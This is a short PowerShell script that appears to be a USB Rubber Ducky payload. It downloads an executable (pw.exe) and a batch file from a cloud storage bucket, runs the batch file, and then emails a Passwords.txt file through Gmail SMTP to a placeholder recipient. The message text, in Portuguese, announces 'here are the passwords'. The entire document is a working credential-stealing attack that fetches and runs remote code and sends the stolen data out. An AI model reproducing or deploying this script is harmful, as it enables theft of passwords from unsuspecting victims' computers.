$PwExe = "pw.exe"
$WebFile = "https://storage.googleapis.com/3dns4rh2sh0bghfy/pw.exe"
Clear-Host
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:USERPROFILE\$PwExe")

$StartBat = "start.bat"
$WebFile = "https://storage.googleapis.com/3dns4rh2sh0bghfy/start.bat"
Clear-Host
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:USERPROFILE\$StartBat")

Start-Process ("$env:USERPROFILE\$StartBat")
Start-Sleep -s 5

$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('USUARIO-GMAIL', 'SENHA-GMAIL')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'USUARIO-GMAIL'
$E.To.Add('DESTINATARIO-EMAIL')
$E.Subject = 'RubberDucky'
$E.Body = 'Aehoooo! Aqui estao as senhas!!! ;)'
$F = "Passwords.txt"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)
exit